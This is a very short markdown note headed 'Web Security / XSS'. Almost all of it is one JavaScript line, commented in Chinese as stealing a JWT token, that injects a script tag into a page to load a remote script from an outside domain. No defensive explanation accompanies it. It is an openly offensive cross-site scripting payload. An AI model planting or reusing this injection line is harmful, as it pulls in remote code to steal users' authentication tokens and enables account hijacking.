# Web Security 

## XSS


https://cdn.xgqfrms.xyz/web-security/xss-jwt-token.js

```js
// XSS 窃取 JWT token
document.body.insertAdjacentHTML(`beforeend`, `<script src="https://cdn.xgqfrms.xyz/web-security/xss-jwt-token.js" async></script>`);

```
